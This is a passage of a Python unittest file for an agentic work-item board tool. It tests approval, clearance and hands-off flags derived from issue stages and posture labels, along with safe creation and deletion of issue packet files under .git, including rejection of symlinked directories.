                out = lb.verb_groom_verify(182, _ctx(str(d)), runner, deboard=None)
            self.assertTrue(out["groomed"])
            self.assertEqual(out["warnings"], [])

    def test_approved_false_on_a_freshly_decomposed_item(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [])
            self.assertTrue(out["groomed"])
            self.assertFalse(out["approved"])

    def test_approved_true_once_stamped_ready_for_work(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "ready_for_work", [])
            self.assertTrue(out["groomed"])
            self.assertTrue(out["approved"])

    def test_approved_true_for_every_stage_at_or_past_ready_for_work(self) -> None:
        for stage in ("ready_for_work", "in_progress", "in_review", "done"):
            with self.subTest(stage=stage):
                with tempfile.TemporaryDirectory() as d:
                    out = self._run(Path(d), stage, [])
                    self.assertTrue(out["approved"])

    def test_approved_and_cleared_are_independent_fields(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            approved_not_cleared = self._run(Path(d), "ready_for_work", [],
                                             labels=["posture:standard"])
            self.assertTrue(approved_not_cleared["approved"])
            self.assertFalse(approved_not_cleared["cleared"])

            cleared_not_approved = self._run(Path(d), "planned", [])
            self.assertFalse(cleared_not_approved["approved"])
            self.assertTrue(cleared_not_approved["cleared"])

    def test_cleared_semantics_unchanged_by_the_approved_field(self) -> None:
        # Regression: `cleared` must remain `groomed and posture ==
        # "autonomous"` for every stage/posture combination, now that
        # `approved` and `hands_off` ride alongside it. Assert by the posture
        # category the field is documented to depend on (per repo policy:
        # category, not a frozen literal).
        cases = [
            ("planned", (), True),
            ("planned", ("posture:standard",), False),
            ("ready_for_work", (), True),
            ("ready_for_work", ("posture:standard",), False),
            ("brainstormed", (), False),  # not groomed
        ]
        with tempfile.TemporaryDirectory() as d:
            for stage, labels, expected_cleared in cases:
                with self.subTest(stage=stage, labels=labels):
                    out = self._run(Path(d), stage, [], labels=list(labels))
                    self.assertEqual(out["cleared"], expected_cleared)
                    self.assertEqual(out["cleared"],
                                     out["groomed"] and out["posture"] == "autonomous")

    def test_hands_off_requires_all_three_legs(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            all_legs = self._run(Path(d), "ready_for_work", [])
            self.assertTrue(all_legs["hands_off"])

            not_approved = self._run(Path(d), "planned", [])
            self.assertTrue(not_approved["cleared"])
            self.assertFalse(not_approved["hands_off"])

            supervised = self._run(Path(d), "ready_for_work", [],
                                   labels=["posture:standard"])
            self.assertTrue(supervised["approved"])
            self.assertFalse(supervised["hands_off"])

            not_groomed = self._run(Path(d), "ready_for_work", [], priority=None)
            self.assertTrue(not_groomed["approved"])
            self.assertFalse(not_groomed["groomed"])
            self.assertFalse(not_groomed["hands_off"])

    def test_hands_off_equals_approved_and_cleared(self) -> None:
        # The invariant across every combination the other tests visit.
        cases = [("planned", ()), ("planned", ("posture:standard",)),
                 ("ready_for_work", ()), ("ready_for_work", ("posture:standard",)),
                 ("brainstormed", ()), ("in_progress", ())]
        with tempfile.TemporaryDirectory() as d:
            for stage, labels in cases:
                with self.subTest(stage=stage, labels=labels):
                    out = self._run(Path(d), stage, [], labels=list(labels))
                    self.assertEqual(out["hands_off"],
                                     out["approved"] and out["cleared"])


class PacketVerbTest(unittest.TestCase):
    @staticmethod
    def _payload(stage="planned", state="OPEN"):
        return json.dumps({"data": {"repository": {"issue": {
            "number": 182, "title": "Implement packets", "body": "## Scope\nDo the work",
            "updatedAt": "2026-07-20T12:00:00Z", "state": state,
            "stateReason": "COMPLETED" if state == "CLOSED" else None,
            "url": "https://github.com/o/r/issues/182", "authorAssociation": "MEMBER",
            "blockedBy": {"nodes": [{"number": 9, "title": "Foundation",
                "url": "https://github.com/o/r/issues/9", "state": "OPEN"}]},
            "assignees": {"nodes": []}, "closedByPullRequestsReferences": {"nodes": []},
            "subIssues": {"nodes": [{"number": 183, "title": "Child", "body": "Child body",
                "url": "https://github.com/o/r/issues/183", "state": "OPEN",
                "blockedBy": {"nodes": [{"number": 9,
                    "title": "Foundation", "url": "https://github.com/o/r/issues/9",
                    "state": "OPEN"}]}}]},
            "projectItems": {"nodes": [{"id": "IT_1",
                "project": {"id": "PJ", "number": 1, "owner": {"login": "o"}},
                "fieldValueByName": {"name": stage}}]}}}}})

    def _run(self, common, stage="planned", state="OPEN"):
        ctx = _ctx(str(common / "worktree"))
        runner = FakeRunner([(["api", "graphql"], _ok(self._payload(stage, state)))])
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        return ctx, runner, board

    def test_materialize_is_private_atomic_and_outside_worktree(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common)
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                out = lb.verb_materialize_packet(182, ctx, runner)
            path = Path(out["packet_path"])
            self.assertEqual(path, common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md")
            self.assertEqual(path.stat().st_mode & 0o777, 0o600)
            text = path.read_text(encoding="utf-8")
            self.assertIn("## Canonical issue body", text)
            self.assertIn("untrusted requirements data", text)
            self.assertIn("Implement packets", text)
            self.assertIn("#183: Child", text)
            self.assertEqual(list((common / "worktree").iterdir()), [])
            query = next(a for a in runner.calls[0] if a.startswith("query="))
            self.assertNotIn("comments", query)

    def test_materialize_terminal_issue_rejects_and_removes_stale_packet(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common, "done", "CLOSED")
            target = common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md"
            target.parent.mkdir(parents=True)
            target.write_text("stale", encoding="utf-8")
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_materialize_packet(182, ctx, runner)
            self.assertEqual(caught.exception.code, "packet_materialize_terminal")
            self.assertFalse(target.exists())

    def test_delete_refuses_non_terminal_issue(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common, "in_review", "OPEN")
            target = common / ".git" / "agentic-engineering" / "work-items" / "o--r--182.md"
            target.parent.mkdir(parents=True)
            target.write_text("keep", encoding="utf-8")
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_delete_packet(182, ctx, runner)
            self.assertEqual(caught.exception.code, "packet_delete_not_terminal")
            self.assertTrue(target.exists())

    def test_delete_unlinks_only_exact_issue_path(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx, runner, board = self._run(common, "done", "CLOSED")
            directory = common / ".git" / "agentic-engineering" / "work-items"
            directory.mkdir(parents=True)
            target = directory / "o--r--182.md"
            neighbor = directory / "o--r--183.md"
            neighbor.write_text("neighbor", encoding="utf-8")
            target.symlink_to(neighbor)
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                out = lb.verb_delete_packet(182, ctx, runner)
            self.assertTrue(out["deleted"])
            self.assertFalse(target.exists())
            self.assertEqual(neighbor.read_text(encoding="utf-8"), "neighbor")

    def test_symlinked_packet_parent_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            (common / ".git").mkdir()
            escape = common / "escape"
            escape.mkdir()
            (common / ".git" / "agentic-engineering").symlink_to(escape, target_is_directory=True)
            ctx, runner, board = self._run(common)
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                with self.assertRaises(lb.BoardError) as caught:
                    lb.verb_materialize_packet(182, ctx, runner)
            self.assertEqual(caught.exception.code, "packet_path_unsafe")
            self.assertEqual(list(escape.iterdir()), [])

    def test_targeted_reconcile_cleans_abandoned_packet_idempotently(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            common = Path(d)
            (common / "worktree").mkdir()
            ctx = _ctx(str(common / "worktree"))
            payload = json.loads(self._payload("abandoned", "CLOSED"))
            payload["data"]["repository"]["issue"]["subIssues"]["nodes"] = []
            runner = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
            board = lb.BoardConfig(owner="o", number=1, source="committed")
            directory = common / ".git" / "agentic-engineering" / "work-items"
            directory.mkdir(parents=True)
            target = directory / "o--r--182.md"
            neighbor = directory / "o--r--183.md"
            target.write_text("packet", encoding="utf-8")
            neighbor.write_text("neighbor", encoding="utf-8")
            with mock.patch.object(lb, "read_board_config", return_value=board), \
                    mock.patch.object(lb, "git_common_dir", return_value=common / ".git"):
                first = lb.verb_reconcile(ctx, runner, issue=182, force=True)
                runner2 = FakeRunner([(["api", "graphql"], _ok(json.dumps(payload)))])
                second = lb.verb_reconcile(ctx, runner2, issue=182, force=True)
            self.assertEqual(first["packet_cleanup"][0]["deleted"], True)
            self.assertEqual(second["packet_cleanup"][0]["deleted"], False)
            self.assertFalse(target.exists())
            self.assertEqual(neighbor.read_text(encoding="utf-8"), "neighbor")


if __name__ == "__main__":
    unittest.main()
